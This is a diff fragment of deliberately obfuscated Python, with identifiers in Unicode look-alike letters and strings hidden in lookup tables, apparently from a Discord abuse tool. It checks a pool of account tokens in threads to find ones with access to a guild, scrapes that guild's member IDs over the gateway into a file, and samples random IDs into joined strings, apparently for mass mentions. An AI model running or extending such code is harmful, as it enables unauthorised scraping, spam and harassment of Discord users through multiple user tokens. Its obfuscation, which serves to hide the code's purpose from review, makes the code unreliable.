+                                if not 𝙢𝙚𝗺[𝘐𝘕𝘐𝗡𝙡𝙡𝗜𝙈𝗜𝗜𝘭𝗠𝘭𝗹𝙄𝗹𝙡𝗡𝘕𝗜𝙡𝘭𝗠𝙉𝗹𝘕𝘭𝗠𝙄𝘔𝙄𝘔[207]].get(𝙄𝙉𝘐𝗡𝙡𝙡𝗜𝗠𝗜𝗜𝗹𝘔𝙡𝙡𝘐𝘭𝗹𝗡𝘕𝘐𝙡𝘭𝗠𝙉𝘭𝙉𝘭𝙈𝙄𝙈𝙄𝘔[211]):
+                                    𝙨𝙚𝗹𝗳.members[𝘮𝙚𝘮[𝗜𝗡𝙄𝗡𝘭𝘭𝙄𝘔𝘐𝙄𝘭𝙈𝗹𝘭𝘐𝗹𝙡𝘕𝘕𝗜𝙡𝗹𝙈𝘕𝙡𝗡𝙡𝗠𝘐𝗠𝙄𝗠[207]][𝗜𝙉𝗜𝗡𝗹𝘭𝗜𝘔𝙄𝘐𝙡𝘔𝙡𝙡𝘐𝙡𝘭𝗡𝘕𝙄𝘭𝘭𝗠𝗡𝙡𝘕𝗹𝗠𝗜𝘔𝙄𝘔[160]]] = 𝙤𝗯𝘫
+                    elif 𝙞𝗻𝙙𝗲𝘹 == 𝗜𝗡𝘐𝗡𝗹𝘭𝗜𝙈𝗜𝘐𝘭𝗠𝗹𝘭𝘐𝗹𝙡𝗡𝘕𝗜𝘭𝙡𝗠𝗡𝘭𝘕𝘭𝘔𝘐𝗠𝙄𝙈[175]:
+                        for 𝘪𝘁𝗲𝗺 in 𝘱𝙖𝗿𝘴𝗲𝙙[𝘐𝙉𝗜𝘕𝘭𝗹𝗜𝗠𝘐𝗜𝙡𝗠𝘭𝗹𝙄𝗹𝙡𝙉𝗡𝘐𝙡𝗹𝘔𝗡𝘭𝘕𝘭𝙈𝗜𝘔𝘐𝙈[165]][𝙚𝗹𝗲𝘮]:
+                            if 𝙄𝙉𝘐𝘕𝙡𝙡𝗜𝗠𝗜𝙄𝙡𝙈𝗹𝘭𝘐𝙡𝙡𝘕𝗡𝗜𝘭𝘭𝙈𝘕𝗹𝘕𝗹𝗠𝗜𝗠𝗜𝗠[205] in 𝙞𝘁𝘦𝗺:
+                                𝗺𝗲𝘮 = 𝘪𝙩𝘦𝘮[𝘐𝘕𝗜𝘕𝘭𝙡𝗜𝘔𝗜𝗜𝗹𝘔𝙡𝗹𝙄𝗹𝘭𝘕𝘕𝘐𝗹𝘭𝘔𝗡𝘭𝘕𝙡𝙈𝙄𝘔𝙄𝘔[205]]
+                                𝙤𝘣𝗷 = {𝗜𝗡𝙄𝙉𝙡𝗹𝗜𝘔𝗜𝗜𝗹𝘔𝘭𝙡𝗜𝗹𝗹𝙉𝙉𝙄𝙡𝘭𝙈𝘕𝗹𝙉𝙡𝘔𝙄𝙈𝙄𝘔[206]: 𝙢𝗲𝘮[𝘐𝘕𝙄𝘕𝗹𝙡𝙄𝗠𝗜𝘐𝘭𝘔𝗹𝙡𝙄𝘭𝘭𝗡𝗡𝘐𝗹𝗹𝗠𝗡𝗹𝙉𝗹𝗠𝗜𝘔𝙄𝘔[207]][𝗜𝘕𝙄𝗡𝙡𝙡𝙄𝙈𝙄𝙄𝙡𝘔𝙡𝙡𝘐𝙡𝗹𝘕𝘕𝘐𝘭𝗹𝙈𝘕𝙡𝘕𝙡𝘔𝙄𝗠𝙄𝘔[208]] + 𝗜𝗡𝙄𝙉𝘭𝘭𝗜𝘔𝙄𝙄𝘭𝙈𝙡𝗹𝙄𝙡𝙡𝙉𝘕𝙄𝗹𝙡𝗠𝙉𝘭𝗡𝘭𝗠𝗜𝘔𝘐𝙈[209] + 𝗺𝘦𝙢[𝙄𝘕𝗜𝙉𝘭𝘭𝘐𝙈𝙄𝙄𝘭𝘔𝙡𝗹𝙄𝘭𝙡𝗡𝗡𝗜𝙡𝙡𝙈𝗡𝗹𝗡𝘭𝙈𝗜𝗠𝙄𝙈[207]][𝘐𝗡𝗜𝙉𝗹𝙡𝙄𝗠𝘐𝘐𝙡𝙈𝙡𝘭𝙄𝗹𝗹𝗡𝙉𝗜𝘭𝙡𝘔𝗡𝙡𝙉𝘭𝗠𝘐𝗠𝗜𝗠[210]], 𝗜𝙉𝘐𝙉𝗹𝙡𝗜𝗠𝗜𝘐𝘭𝘔𝘭𝙡𝙄𝘭𝗹𝘕𝙉𝘐𝙡𝘭𝙈𝙉𝘭𝗡𝘭𝘔𝗜𝙈𝗜𝙈[160]: 𝙢𝙚𝘮[𝘐𝘕𝗜𝘕𝙡𝙡𝘐𝗠𝗜𝘐𝗹𝘔𝗹𝙡𝙄𝗹𝗹𝙉𝘕𝘐𝘭𝙡𝙈𝗡𝘭𝗡𝘭𝗠𝘐𝙈𝘐𝙈[207]][𝗜𝘕𝘐𝘕𝘭𝘭𝘐𝗠𝙄𝗜𝗹𝙈𝘭𝗹𝘐𝘭𝗹𝘕𝙉𝗜𝗹𝗹𝘔𝗡𝗹𝘕𝘭𝙈𝗜𝘔𝙄𝘔[160]]}
+                                if not 𝙢𝗲𝗺[𝗜𝗡𝗜𝙉𝘭𝗹𝗜𝗠𝙄𝘐𝘭𝘔𝘭𝙡𝙄𝗹𝗹𝙉𝙉𝘐𝙡𝗹𝙈𝘕𝗹𝘕𝘭𝘔𝘐𝗠𝙄𝘔[207]].get(𝘐𝙉𝙄𝘕𝘭𝘭𝗜𝘔𝘐𝘐𝗹𝘔𝘭𝘭𝘐𝘭𝗹𝙉𝗡𝘐𝗹𝗹𝘔𝙉𝙡𝗡𝙡𝗠𝙄𝘔𝗜𝙈[211]):
+                                    𝙨𝘦𝘭𝘧.members[𝗺𝘦𝘮[𝘐𝗡𝘐𝘕𝗹𝙡𝙄𝘔𝗜𝗜𝙡𝘔𝘭𝗹𝙄𝘭𝙡𝙉𝙉𝗜𝙡𝗹𝗠𝘕𝙡𝙉𝙡𝗠𝘐𝙈𝙄𝙈[207]][𝙄𝗡𝙄𝘕𝙡𝗹𝙄𝘔𝘐𝘐𝗹𝗠𝗹𝗹𝘐𝙡𝙡𝙉𝙉𝘐𝘭𝗹𝘔𝘕𝙡𝗡𝘭𝘔𝙄𝗠𝘐𝙈[160]]] = 𝙤𝙗𝗷
+                    𝘀𝗲𝙡𝗳.lastRange += 1
+                    𝘀𝘦𝙩𝗮𝘁𝙩𝗿(𝙨𝙚𝗹𝙛, 'ranges', 𝙐𝙩𝗶𝗹𝙨.getRanges(𝘴𝘦𝙡𝘧.lastRange, 100, 𝙨𝘦𝙡𝙛.guilds[𝘀𝘦𝘭𝘧.guild_id][𝙄𝙉𝘐𝙉𝗹𝙡𝗜𝘔𝙄𝗜𝗹𝗠𝘭𝙡𝗜𝗹𝙡𝙉𝙉𝘐𝙡𝘭𝘔𝘕𝘭𝗡𝗹𝗠𝗜𝙈𝘐𝗠[159]]))
+                    𝙩𝘪𝗺𝘦.sleep(0.45)
+                    𝙨𝘦𝙡𝗳.scrapeUsers()
+            if 𝘀𝙚𝘭𝙛.endScraping:
+                𝘀𝘦𝙡𝙛.close()
 
     def sock_close(self, ws, close_code, close_msg):
         pass
 
 def scrape(token, guild_id, channel_id):
-    𝘀𝗯 = 𝘿𝗶𝘀𝗰𝗼𝙧𝗱𝗦𝙤𝘤𝙠𝙚𝘁(𝘁𝗼𝙠𝙚𝙣, 𝘨𝘶𝙞𝘭𝘥_𝙞𝘥, 𝙘𝙝𝘢𝙣𝗻𝙚𝗹_𝙞𝙙)
-    return 𝘴𝙗.run()
+    𝘀𝗯 = 𝘿𝗶𝙨𝙘𝗼𝙧𝙙𝗦𝙤𝘤𝗸𝙚𝘵(𝘁𝘰𝗸𝘦𝘯, 𝘨𝘶𝗶𝘭𝗱_𝗶𝘥, 𝙘𝙝𝘢𝗻𝙣𝙚𝗹_𝘪𝗱)
+    return 𝘀𝙗.run()
 
 def scraper(guildid, channelid):
-    with 𝗼𝗽𝙚𝗻(𝗡𝗠𝙈𝘔𝗡𝘭𝙡𝘔𝗠𝘭𝘔𝘔𝘕𝘭𝘐𝙈𝘐𝗜𝙉𝙈𝙄𝘐𝘔𝘐𝗹𝙄𝘕𝘐𝙈𝗜𝘐𝙈[219], 𝗡𝙈𝘔𝘔𝙉𝙡𝘭𝙈𝘔𝙡𝘔𝗠𝘕𝘭𝗜𝙈𝙄𝗜𝘕𝗠𝗜𝘐𝗠𝙄𝘭𝘐𝙉𝘐𝗠𝘐𝗜𝙈[220]) as 𝙛:
-        𝙛.truncate(0)
-    𝘁𝘰𝘬𝙚𝘯 = 𝙉𝙈𝘔𝘔𝘕𝗹𝙡𝙈𝙈𝘭𝗠𝗠𝗡𝗹𝘐𝗠𝙄𝗜𝘕𝗠𝗜𝙄𝙈𝙄𝘭𝙄𝗡𝘐𝙈𝘐𝗜𝗠[29]
-    𝘁𝘰𝙠𝘦𝗻𝘀𝙞𝗻𝙜𝘂𝘪𝗹𝗱 = []
-    𝙩𝙤𝘬𝗲𝙣 = 𝘳𝗮𝘯𝙙𝘰𝘮.choice(𝘁𝘰𝘬𝘦𝘯𝙨)
-    𝘶𝘳𝘭 = f'{𝗡𝙈𝘔𝙈𝘕𝘭𝘭𝗠𝘔𝗹𝗠𝘔𝙉𝙡𝘐𝗠𝘐𝗜𝘕𝗠𝘐𝘐𝗠𝘐𝙡𝘐𝙉𝗜𝙈𝗜𝙄𝗠[159]}{𝘨𝘶𝗶𝗹𝙙𝙞𝙙}'
+    with 𝙤𝗽𝙚𝙣(𝘐𝗡𝘐𝙉𝘭𝗹𝘐𝘔𝘐𝘐𝗹𝗠𝘭𝗹𝙄𝗹𝙡𝙉𝗡𝘐𝙡𝗹𝗠𝘕𝙡𝗡𝘭𝙈𝗜𝘔𝘐𝘔[212], 𝙄𝙉𝙄𝗡𝙡𝘭𝙄𝗠𝘐𝘐𝘭𝗠𝘭𝙡𝗜𝙡𝙡𝙉𝘕𝘐𝘭𝙡𝙈𝗡𝙡𝘕𝘭𝘔𝘐𝙈𝗜𝙈[213]) as 𝘧:
+        𝗳.truncate(0)
+    𝙩𝘰𝗸𝗲𝗻 = 𝘐𝗡𝘐𝙉𝗹𝗹𝘐𝙈𝗜𝘐𝙡𝘔𝙡𝗹𝙄𝗹𝘭𝘕𝘕𝘐𝗹𝘭𝘔𝙉𝙡𝗡𝘭𝘔𝙄𝘔𝙄𝙈[22]
+    𝘁𝗼𝘬𝗲𝗻𝙨𝗶𝘯𝙜𝘂𝘪𝘭𝘥 = []
+    𝘵𝙤𝘬𝗲𝙣 = 𝙧𝙖𝙣𝗱𝙤𝙢.choice(𝘵𝙤𝘬𝘦𝘯𝘴)
+    𝘂𝗿𝙡 = f'{𝗜𝙉𝘐𝗡𝘭𝘭𝗜𝙈𝙄𝙄𝗹𝙈𝙡𝙡𝙄𝗹𝘭𝘕𝘕𝘐𝘭𝙡𝗠𝙉𝗹𝙉𝙡𝙈𝙄𝗠𝙄𝘔[152]}{𝗴𝙪𝙞𝗹𝘥𝗶𝙙}'
 
     def checktokens(token):
-        𝗿 = 𝗿𝘦𝗾𝘂𝙚𝘴𝘁𝘴.get(𝙪𝙧𝘭, headers={𝘕𝗠𝙈𝘔𝗡𝙡𝗹𝘔𝘔𝘭𝗠𝙈𝙉𝗹𝙄𝙈𝙄𝘐𝙉𝗠𝗜𝘐𝙈𝙄𝙡𝗜𝗡𝙄𝗠𝗜𝙄𝘔[137]: 𝘵𝙤𝗸𝙚𝙣})
-        if 𝘳.status_code == 200:
-            𝙩𝗼𝙠𝗲𝗻𝘴𝘪𝘯𝙜𝙪𝙞𝗹𝘥.append(𝙩𝗼𝙠𝗲𝘯)
-    𝘵𝙝𝘳𝙚𝙖𝘥𝘴 = []
-    for 𝙩𝗼𝗸𝘦𝗻 in 𝘁𝙤𝘬𝙚𝙣𝘴:
-        𝙩 = 𝘁𝘩𝙧𝗲𝗮𝗱𝗶𝘯𝗴.Thread(target=𝗰𝘩𝗲𝗰𝙠𝘁𝙤𝗸𝙚𝗻𝙨, args=(f'{𝙩𝗼𝘬𝙚𝘯}',))
+        𝙧 = 𝗿𝙚𝗾𝘶𝙚𝘴𝘵𝘴.get(𝘂𝗿𝘭, headers={𝗜𝙉𝗜𝗡𝗹𝘭𝗜𝗠𝙄𝗜𝙡𝗠𝙡𝘭𝗜𝗹𝗹𝗡𝙉𝗜𝘭𝘭𝗠𝙉𝘭𝘕𝗹𝙈𝗜𝘔𝘐𝘔[130]: 𝘁𝗼𝘬𝗲𝘯})
+        if 𝙧.status_code == 200:
+            𝘵𝘰𝗸𝘦𝘯𝘴𝗶𝘯𝘨𝘶𝗶𝙡𝗱.append(𝘁𝗼𝙠𝘦𝗻)
+    𝘵𝙝𝙧𝘦𝙖𝙙𝙨 = []
+    for 𝙩𝙤𝙠𝗲𝘯 in 𝙩𝙤𝘬𝘦𝙣𝘀:
+        𝘁 = 𝘵𝙝𝙧𝗲𝙖𝘥𝙞𝗻𝙜.Thread(target=𝙘𝗵𝘦𝗰𝙠𝘁𝙤𝘬𝘦𝙣𝙨, args=(f'{𝘁𝗼𝗸𝘦𝙣}',))
         𝘁.start()
-        𝘁𝗵𝙧𝗲𝘢𝘥𝙨.append(𝙩)
-    for 𝘁 in 𝘁𝗵𝘳𝘦𝗮𝙙𝘴:
+        𝘵𝘩𝘳𝙚𝗮𝘥𝘀.append(𝘁)
+    for 𝘵 in 𝘵𝙝𝗿𝙚𝗮𝙙𝘴:
         𝘵.join()
     try:
-        𝘁𝗼𝗸𝗲𝙣 = 𝙧𝙖𝙣𝗱𝗼𝙢.choice(𝘁𝗼𝗸𝘦𝘯𝙨𝙞𝗻𝘨𝘂𝗶𝙡𝙙)
+        𝙩𝙤𝗸𝙚𝗻 = 𝘳𝘢𝙣𝙙𝙤𝗺.choice(𝘁𝗼𝙠𝘦𝗻𝘴𝙞𝙣𝙜𝘂𝗶𝘭𝗱)
     except:
-        𝗽𝙧𝗶𝘯𝘁(𝗡𝘔𝘔𝗠𝙉𝙡𝙡𝙈𝗠𝗹𝙈𝙈𝘕𝘭𝗜𝗠𝘐𝙄𝘕𝘔𝗜𝘐𝗠𝙄𝙡𝗜𝘕𝗜𝙈𝙄𝙄𝙈[221])
-        𝗲𝙭𝘪𝘁(0)
-    𝗺𝗲𝗺𝘣𝗲𝙧𝘀 = 𝘴𝘤𝘳𝙖𝗽𝗲(𝘵𝗼𝘬𝗲𝙣, f'{𝘨𝙪𝗶𝗹𝙙𝘪𝘥}', f'{𝙘𝗵𝗮𝘯𝘯𝙚𝘭𝘪𝘥}')
-    for 𝘮𝘦𝙢𝙗𝗲𝗿 in 𝙢𝙚𝗺𝙗𝘦𝙧𝘀:
-        𝘰𝙥𝘦𝙣(𝙉𝙈𝘔𝗠𝙉𝗹𝙡𝗠𝗠𝘭𝙈𝗠𝗡𝙡𝗜𝗠𝘐𝘐𝘕𝘔𝗜𝘐𝘔𝙄𝗹𝙄𝙉𝗜𝘔𝘐𝗜𝙈[219], 𝙉𝙈𝘔𝙈𝗡𝗹𝘭𝗠𝙈𝗹𝘔𝘔𝘕𝗹𝘐𝗠𝘐𝙄𝗡𝙈𝘐𝗜𝗠𝗜𝙡𝘐𝘕𝘐𝘔𝘐𝙄𝘔[222]).write(𝙣𝗼𝘚𝗟5𝙊𝘝8𝗸𝗜𝙟𝗛𝙨38𝙐𝙪𝗝𝙛𝙍𝘔𝘻𝗸𝙋𝘓𝗨1𝙗𝘪𝘪9𝗔.mro()[7](𝗺𝘦𝙢𝗯𝙚𝗿) + 𝙉𝘔𝘔𝘔𝗡𝙡𝘭𝗠𝗠𝘭𝗠𝙈𝙉𝗹𝙄𝗠𝘐𝙄𝙉𝗠𝗜𝗜𝙈𝗜𝙡𝗜𝙉𝘐𝘔𝗜𝙄𝙈[70])
+        𝗽𝙧𝙞𝙣𝙩(𝗜𝘕𝘐𝗡𝗹𝙡𝙄𝘔𝗜𝙄𝙡𝘔𝘭𝙡𝘐𝗹𝗹𝗡𝙉𝘐𝙡𝗹𝗠𝗡𝙡𝗡𝗹𝘔𝗜𝙈𝗜𝘔[214])
+        𝘦𝘅𝙞𝘵(0)
+    𝙢𝙚𝘮𝗯𝘦𝙧𝙨 = 𝙨𝘤𝙧𝙖𝙥𝗲(𝘵𝙤𝘬𝗲𝘯, f'{𝘨𝙪𝗶𝗹𝙙𝘪𝗱}', f'{𝙘𝘩𝙖𝘯𝘯𝗲𝙡𝙞𝘥}')
+    for 𝘮𝘦𝗺𝘣𝘦𝘳 in 𝘮𝘦𝘮𝙗𝗲𝙧𝘀:
+        𝗼𝘱𝙚𝗻(𝘐𝙉𝗜𝗡𝗹𝙡𝙄𝘔𝙄𝙄𝗹𝘔𝘭𝗹𝙄𝗹𝘭𝗡𝘕𝘐𝙡𝗹𝗠𝗡𝗹𝘕𝘭𝗠𝘐𝘔𝘐𝗠[212], 𝘐𝙉𝙄𝘕𝘭𝙡𝘐𝗠𝙄𝙄𝙡𝗠𝙡𝗹𝗜𝙡𝙡𝙉𝗡𝘐𝙡𝗹𝙈𝘕𝗹𝙉𝘭𝘔𝘐𝙈𝗜𝗠[215]).write(𝘕𝘵𝘹𝗷𝗖𝙯8𝗣𝘼𝗹𝗫7𝙣𝙊𝘠𝘍𝙫𝘧𝘏𝙡1𝙡𝙪𝘽𝘫𝙝𝘪𝙂𝗔𝘪𝗨𝘊.mro()[6](𝙢𝗲𝘮𝘣𝗲𝘳) + 𝗜𝘕𝘐𝗡𝘭𝘭𝗜𝘔𝗜𝘐𝗹𝘔𝗹𝙡𝘐𝗹𝗹𝘕𝙉𝗜𝙡𝗹𝗠𝘕𝘭𝙉𝘭𝙈𝘐𝘔𝗜𝙈[63])
 
 def getrandomids(ids):
-    with 𝗼𝗽𝙚𝙣(f'{𝗡𝘔𝙈𝗠𝙉𝙡𝙡𝗠𝙈𝙡𝙈𝗠𝙉𝙡𝗜𝗠𝙄𝘐𝙉𝗠𝗜𝘐𝘔𝘐𝘭𝗜𝘕𝘐𝘔𝘐𝘐𝗠[219]}', 𝘕𝙈𝘔𝗠𝘕𝘭𝗹𝙈𝗠𝙡𝗠𝘔𝙉𝙡𝘐𝙈𝘐𝘐𝙉𝘔𝙄𝗜𝙈𝗜𝘭𝘐𝘕𝗜𝗠𝘐𝗜𝗠[37], encoding=𝗡𝘔𝗠𝙈𝘕𝙡𝘭𝙈𝙈𝘭𝙈𝗠𝙉𝙡𝘐𝗠𝙄𝙄𝗡𝘔𝘐𝗜𝘔𝗜𝙡𝗜𝙉𝙄𝗠𝗜𝘐𝘔[34]) as 𝘧:
-        𝘥𝙞𝙨𝘤𝗼𝘳𝗱_𝘂𝘴𝘦𝘳𝘴 = [𝗹𝙞𝙣𝘦.strip() for 𝘭𝙞𝗻𝗲 in 𝗳.readlines()]
-    𝗿𝙖𝘯𝗱𝗼𝘮_𝙞𝘥𝙨 = 𝙧𝗮𝗻𝘥𝙤𝘮.sample(𝗱𝗶𝘀𝙘𝗼𝘳𝗱_𝘶𝘀𝙚𝗿𝘴, 𝘪𝗱𝘴)
-    return 𝗡𝗠𝙈𝗠𝘕𝙡𝘭𝙈𝙈𝘭𝙈𝗠𝙉𝙡𝘐𝙈𝘐𝗜𝗡𝘔𝘐𝗜𝙈𝘐𝙡𝘐𝙉𝙄𝘔𝗜𝗜𝗠[223] + 𝙉𝙈𝗠𝙈𝘕𝗹𝙡𝗠𝗠𝘭𝗠𝗠𝘕𝘭𝙄𝗠𝘐𝙄𝙉𝗠𝙄𝗜𝙈𝙄𝗹𝙄𝘕𝗜𝙈𝘐𝙄𝘔[224].join(𝗿𝙖𝙣𝗱𝙤𝘮_𝗶𝙙𝘴) + 𝙉𝙈𝙈𝘔𝘕𝙡𝙡𝗠𝙈𝙡𝗠𝘔𝙉𝘭𝘐𝙈𝗜𝘐𝗡𝙈𝗜𝘐𝘔𝙄𝙡𝗜𝗡𝗜𝗠𝙄𝘐𝙈[225]
+    with 𝙤𝘱𝗲𝙣(f'{𝙄𝙉𝙄𝗡𝘭𝙡𝘐𝗠𝘐𝙄𝙡𝘔𝙡𝘭𝘐𝗹𝙡𝘕𝗡𝗜𝗹𝗹𝘔𝙉𝙡𝗡𝙡𝙈𝘐𝙈𝗜𝙈[212]}', 𝙄𝘕𝗜𝘕𝗹𝙡𝗜𝙈𝙄𝘐𝗹𝘔𝙡𝙡𝙄𝗹𝙡𝗡𝘕𝗜𝙡𝗹𝘔𝘕𝘭𝘕𝙡𝘔𝙄𝙈𝘐𝘔[30], encoding=𝘐𝙉𝘐𝗡𝗹𝘭𝘐𝗠𝗜𝘐𝗹𝙈𝘭𝙡𝙄𝗹𝙡𝘕𝗡𝘐𝘭𝗹𝗠𝗡𝘭𝘕𝗹𝘔𝘐𝙈𝗜𝗠[27]) as 𝗳:
+        𝘥𝘪𝘀𝘤𝙤𝙧𝙙_𝘂𝙨𝘦𝗿𝙨 = [𝙡𝗶𝗻𝗲.strip() for 𝗹𝙞𝙣𝗲 in 𝗳.readlines()]
+    𝘳𝙖𝗻𝙙𝘰𝗺_𝙞𝘥𝙨 = 𝗿𝗮𝗻𝙙𝗼𝙢.sample(𝘥𝗶𝘀𝗰𝙤𝗿𝗱_𝘶𝘀𝙚𝗿𝙨, 𝗶𝙙𝙨)
+    return 𝗜𝗡𝘐𝗡𝗹𝙡𝗜𝙈𝗜𝘐𝗹𝗠𝘭𝗹𝘐𝘭𝘭𝙉𝗡𝙄𝙡𝘭𝗠𝗡𝘭𝙉𝙡𝗠𝙄𝗠𝘐𝘔[216] + 𝙄𝗡𝙄𝘕𝗹𝘭𝘐𝘔𝗜𝙄𝘭𝘔𝗹𝗹𝙄𝗹𝗹𝗡𝗡𝗜𝗹𝙡𝘔𝗡𝗹𝘕𝘭𝘔𝗜𝙈𝗜𝘔[217].join(𝗿𝗮𝘯𝗱𝙤𝗺_𝙞𝘥𝘀) + 𝗜𝗡𝗜𝘕𝘭𝘭𝘐𝘔𝘐𝗜𝗹𝙈𝙡𝘭𝘐𝙡𝗹𝗡𝘕𝙄𝘭𝘭𝗠𝘕𝘭𝙉𝗹𝘔𝘐𝙈𝙄𝙈[218]
 
 def Headers(token):
-    return {𝙉𝘔𝗠𝗠𝘕𝗹𝗹𝗠𝘔𝘭𝙈𝙈𝙉𝘭𝗜𝗠𝙄𝗜𝙉𝘔𝗜𝙄𝙈𝘐𝙡𝘐𝘕𝙄𝘔𝗜𝗜𝙈[226]: 𝘵𝘰𝗸𝘦𝗻, 𝘕𝗠𝘔𝘔𝙉𝙡𝘭𝙈𝘔𝙡𝗠𝘔𝘕𝗹𝗜𝘔𝗜𝙄𝗡𝙈𝙄𝗜𝗠𝙄𝗹𝙄𝘕𝘐𝗠𝗜𝙄𝗠[134]: 𝙉𝘔𝗠𝙈𝘕𝙡𝘭𝙈𝘔𝗹𝙈𝙈𝙉𝙡𝗜𝙈𝙄𝗜𝙉𝗠𝙄𝗜𝗠𝙄𝙡𝗜𝗡𝙄𝘔𝙄𝗜𝘔[143], 𝙉𝙈𝙈𝙈𝙉𝙡𝗹𝗠𝘔𝗹𝗠𝗠𝘕𝗹𝙄𝘔𝗜𝘐𝙉𝘔𝙄𝘐𝘔𝘐𝙡𝗜𝗡𝘐𝙈𝙄𝙄𝗠[135]: 𝗡𝙈𝙈𝙈𝙉𝗹𝗹𝗠𝘔𝙡𝙈𝗠𝘕𝗹𝘐𝘔𝙄𝙄𝙉𝗠𝙄𝗜𝘔𝙄𝗹𝗜𝗡𝙄𝘔𝙄𝘐𝗠[144], 𝘕𝗠𝗠𝗠𝗡𝘭𝘭𝗠𝙈𝙡𝙈𝗠𝘕𝙡𝗜𝘔𝘐𝗜𝙉𝗠𝙄𝙄𝙈𝙄𝘭𝗜𝘕𝘐𝙈𝘐𝙄𝘔[136]: 𝘕𝘔𝘔𝙈𝗡𝘭𝙡𝙈𝗠𝘭𝙈𝙈𝘕𝙡𝙄𝙈𝘐𝙄𝙉𝘔𝘐𝙄𝘔𝙄𝙡𝙄𝙉𝙄𝗠𝘐𝙄𝘔[237], 𝘕𝗠𝙈𝗠𝗡𝗹𝙡𝙈𝙈𝗹𝗠𝙈𝙉𝗹𝗜𝗠𝙄𝗜𝙉𝗠𝗜𝙄𝙈𝘐𝘭𝙄𝘕𝗜𝗠𝙄𝘐𝙈[227]: 𝗡𝙈𝘔𝗠𝘕𝗹𝙡𝙈𝗠𝗹𝙈𝙈𝘕𝗹𝗜𝘔𝗜𝙄𝗡𝙈𝙄𝘐𝙈𝗜𝗹𝘐𝗡𝙄𝘔𝗜𝗜𝘔[238], 𝗡𝘔𝘔𝙈𝘕𝘭𝗹𝙈𝗠𝙡𝙈𝗠𝙉𝙡𝙄𝗠𝙄𝘐𝗡𝘔𝘐𝘐𝘔𝗜𝗹𝗜𝘕𝗜𝗠𝙄𝗜𝗠[138]: 𝘕𝙈𝙈𝘔𝙉𝘭𝘭𝘔𝗠𝙡𝘔𝘔𝗡𝗹𝘐𝙈𝘐𝙄𝗡𝙈𝙄𝘐𝘔𝙄𝘭𝘐𝗡𝙄𝘔𝙄𝙄𝗠[239], 𝘕𝙈𝗠𝗠𝗡𝗹𝙡𝗠𝗠𝙡𝙈𝗠𝙉𝙡𝗜𝙈𝘐𝗜𝗡𝘔𝗜𝘐𝙈𝙄𝗹𝘐𝗡𝗜𝙈𝗜𝘐𝙈[228]: 𝘕𝗠𝗠𝙈𝙉𝙡𝘭𝘔𝙈𝙡𝗠𝘔𝙉𝗹𝗜𝙈𝘐𝘐𝙉𝗠𝗜𝙄𝗠𝗜𝙡𝘐𝙉𝘐𝗠𝙄𝘐𝗠[107], 𝗡𝘔𝘔𝙈𝘕𝙡𝘭𝙈𝗠𝙡𝘔𝗠𝘕𝗹𝗜𝙈𝘐𝙄𝘕𝙈𝗜𝙄𝙈𝙄𝗹𝗜𝙉𝘐𝘔𝗜𝘐𝗠[229]: 𝗡𝘔𝗠𝗠𝗡𝙡𝘭𝙈𝘔𝘭𝙈𝙈𝘕𝘭𝘐𝙈𝗜𝘐𝘕𝗠𝘐𝗜𝙈𝗜𝙡𝘐𝗡𝙄𝗠𝗜𝙄𝙈[240], 𝙉𝙈𝙈𝗠𝗡𝗹𝘭𝙈𝘔𝘭𝘔𝙈𝘕𝗹𝗜𝗠𝘐𝘐𝘕𝙈𝘐𝗜𝗠𝙄𝘭𝗜𝙉𝘐𝘔𝘐𝘐𝙈[230]: 𝗡𝘔𝙈𝘔𝘕𝗹𝙡𝗠𝙈𝘭𝙈𝗠𝘕𝙡𝙄𝙈𝘐𝙄𝙉𝗠𝙄𝗜𝗠𝗜𝙡𝘐𝗡𝗜𝘔𝙄𝗜𝘔[241], 𝙉𝙈𝘔𝘔𝗡𝙡𝘭𝙈𝘔𝘭𝙈𝗠𝘕𝙡𝘐𝗠𝗜𝙄𝘕𝗠𝙄𝙄𝙈𝙄𝙡𝗜𝙉𝗜𝙈𝙄𝘐𝗠[231]: 𝘕𝙈𝗠𝙈𝗡𝘭𝗹𝘔𝙈𝘭𝘔𝙈𝙉𝙡𝙄𝗠𝘐𝗜𝗡𝙈𝘐𝗜𝘔𝘐𝘭𝘐𝘕𝙄𝙈𝘐𝙄𝗠[242], 𝗡𝘔𝘔𝗠𝙉𝙡𝗹𝗠𝙈𝗹𝘔𝗠𝙉𝙡𝙄𝘔𝗜𝙄𝙉𝙈𝙄𝘐𝗠𝗜𝙡𝗜𝗡𝗜𝗠𝗜𝗜𝘔[232]: 𝘕𝘔𝙈𝗠𝙉𝙡𝙡𝗠𝘔𝗹𝘔𝗠𝘕𝗹𝗜𝘔𝘐𝘐𝘕𝗠𝗜𝗜𝙈𝘐𝘭𝘐𝘕𝗜𝘔𝗜𝙄𝗠[243], 𝙉𝘔𝘔𝙈𝘕𝙡𝙡𝙈𝙈𝙡𝘔𝘔𝘕𝗹𝘐𝗠𝘐𝙄𝘕𝘔𝙄𝙄𝙈𝙄𝙡𝗜𝗡𝗜𝗠𝙄𝗜𝙈[233]: 𝙉𝙈𝗠𝗠𝙉𝙡𝙡𝙈𝗠𝙡𝙈𝘔𝙉𝘭𝙄𝗠𝘐𝗜𝗡𝙈𝗜𝘐𝗠𝘐𝙡𝙄𝘕𝗜𝙈𝘐𝙄𝗠[244], 𝙉𝙈𝘔𝘔𝘕𝙡𝙡𝗠𝗠𝗹𝙈𝗠𝙉𝗹𝘐𝙈𝗜𝙄𝗡𝘔𝗜𝘐𝘔𝙄𝘭𝗜𝗡𝘐𝗠𝗜𝙄𝙈[234]: 𝗡𝘔𝙈𝗠𝘕𝗹𝗹𝘔𝙈𝙡𝙈𝗠𝗡𝙡𝙄𝗠𝗜𝙄𝘕𝙈𝘐𝗜𝙈𝘐𝘭𝙄𝗡𝙄𝙈𝗜𝗜𝙈[245], 𝘕𝙈𝙈𝘔𝗡𝘭𝙡𝘔𝘔𝗹𝗠𝙈𝙉𝘭𝙄𝙈𝙄𝗜𝙉𝘔𝘐𝗜𝘔𝗜𝗹𝗜𝘕𝙄𝙈𝘐𝗜𝘔[140]: 𝙉𝘔𝙈𝘔𝘕𝙡𝘭𝙈𝗠𝗹𝘔𝘔𝙉𝙡𝙄𝗠𝘐𝙄𝙉𝗠𝘐𝙄𝘔𝗜𝘭𝘐𝙉𝙄𝙈𝘐𝗜𝘔[246], 𝗡𝙈𝙈𝙈𝙉𝙡𝗹𝙈𝗠𝙡𝙈𝗠𝗡𝘭𝗜𝙈𝘐𝗜𝙉𝙈𝘐𝙄𝙈𝘐𝙡𝘐𝘕𝘐𝗠𝙄𝙄𝗠[235]: 